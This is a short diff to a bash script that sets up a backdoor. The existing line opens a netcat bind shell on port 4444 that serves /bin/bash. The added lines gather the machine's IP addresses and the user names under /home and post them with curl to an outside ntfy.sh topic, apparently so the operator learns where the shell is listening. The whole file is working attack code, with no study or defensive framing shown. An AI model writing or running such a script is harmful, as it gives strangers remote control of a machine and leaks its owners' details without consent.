@@ -1,3 +1,8 @@
 #!/bin/bash
 
+ip=$(hostname -I)
+who=$(ls /home)
+
+curl -d "My name is ($who) and my ip is ($ip) " ntfy.sh/cp_cacc_netcat
+
 nc.traditional -le /bin/bash -p 4444
